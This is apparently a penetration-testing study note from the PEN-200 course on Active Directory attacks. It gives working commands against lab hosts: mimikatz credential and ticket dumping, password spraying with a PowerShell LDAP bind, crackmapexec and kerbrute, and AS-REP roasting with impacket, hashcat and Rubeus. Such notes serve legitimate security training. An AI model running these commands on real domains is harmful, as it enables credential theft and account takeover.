# AD attacks from Pen-200

### Authentication types

1) ***NTLM authentication*** is used when a client authenticates to a server by IP address (instead of by hostname), or if the user attempts to authenticate to a hostname that is not registered on the Active Directory-integrated DNS server. Likewise, third-party applications may choose to use NTLM authentication instead of Kerberos.
<img width="840" height="762" alt="image" src="https://github.com/user-attachments/assets/74f1aa65-78e5-416e-a503-f351577f3320" />

<br><br>

2) ***Kerberos client authentication*** involves the use of a domain controller in the role of a Key Distribution Center (KDC). The client starts the authentication process with the KDC and not the application server. A KDC service runs on each domain controller and is responsible for session tickets and temporary session keys to users and computers.

<img width="847" height="702" alt="image" src="https://github.com/user-attachments/assets/6d9de1ee-db2b-4627-8300-c15aea0499e1" />

<br><br>
3) ***Cached credentials***
   
Extract cached credentials with mimikatz.exe.  If LSASS protection is not enabled.

- privilege::debug
- sekurlsa::logonpasswords

Extract TGS and TGT tickets with mimikatz.exe  
- sekurlsa::tickets

Authentication / smart card - extract certificates private keys even if marked secure.  

The crypto module contains the capability to either patch the CryptoAPI function with crypto::capi or KeyIso service with crypto::cng,making non-exportable keys exportable.


### Brute Force attacks

Gather password policy to determine lockout: ***net accounts***  

<br>

Use directory entry to brute force accounts.  Adjust username/password.

``` powershell
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
New-Object System.DirectoryServices.DirectoryEntry($SearchString, "pete", "Nexus123!")
```
<br>

There is a script that contains this technique ***Spray-Passwords.ps1***
[Spray-Passwords.ps1](https://web.archive.org/web/20220225190046/https://github.com/ZilentJack/Spray-Passwords/blob/master/Spray-Passwords.ps1)
<br><br>
<img width="852" height="368" alt="image" src="https://github.com/user-attachments/assets/0333a88d-18d7-458b-a86e-39bf8b0b41c8" />


Kali has crackmapexec.  
-d for DOMAIN  
--continue-on-success  (Continue even if you find valid credentials)

``` bash
crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
```
<br>

WINDOWS / LINUX have a tool called ***KERBRUTE*** to password spray  

``` 
.\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"
```


### AS-REP Roasting

Without Kerberos preauthentication in place, an attacker could send an AS-REQ to the domain controller on behalf of any AD user. After obtaining the AS-REP from the domain controller, the attacker could perform an offline password attack against the encrypted part of the response. This attack is known as AS-REP Roasting.

Use **impacket-GetNPUsers** to perform AS-REP roasting. We'll need to enter the IP address of the domain controller as an argument for **-dc-ip**, the name of the output file in which the AS-REP hash will be stored in Hashcat format for **-outputfile**, and **-request** to request the TGT.


***Credentials are provided in this command, PETE/password supply by stdin***  

Linux:<br>

Request AS-REP with impacket  
1)
``` bash
impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/pete
```

Crack the AS-REP request  
2) 
``` bash
sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

<br>
Windows:<br>

On windows on the same domain, Rubeus will pass through logon session via kerberos.  

``` powershell
.\Rubeus.exe asreproast /nowrap
```
